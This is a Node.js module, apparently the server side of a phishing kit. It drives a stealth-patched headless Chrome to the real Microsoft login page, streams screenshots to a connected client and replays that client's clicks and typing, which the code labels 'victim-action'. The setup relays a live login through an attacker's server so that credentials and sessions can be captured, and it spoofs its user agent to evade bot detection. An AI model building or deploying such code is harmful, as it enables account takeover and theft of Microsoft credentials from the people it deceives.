const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[INIT] Starting session for ${socket.id}`);
    let browser;

    try {
        // Optimized for Railway/Docker Production
        browser = await puppeteer.launch({
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome', // Common Railway path
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-first-run',
                '--no-zygote',
                '--single-process' 
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // Set a standard User Agent to avoid bot detection
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        console.log(`[GOTO] Navigating to Microsoft...`);
        await page.goto('https://login.microsoftonline.com/', { 
            waitUntil: 'networkidle0',
            timeout: 30000 
        });

        // Forced Render Function
        const emitFrame = async () => {
            try {
                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                socket.emit('browser-render', { screenshot });
                console.log(`[FRAME] Sent to ${socket.id}`);
            } catch (e) {
                console.error("[!] Render Error:", e.message);
            }
        };

        // Send the first frame immediately
        await emitFrame();

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'type') {
                    await page.type(data.selector || 'body', data.text, { delay: 50 });
                }
                // Always re-render after action
                await emitFrame();
            } catch (err) {
                console.error('[!] Action Error:', err.message);
            }
        });

        socket.on('disconnect', async () => {
            console.log(`[EXIT] Closing browser for ${socket.id}`);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL FAILURE]', error.message);
        socket.emit('error', { msg: "Environment setup failed" });
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
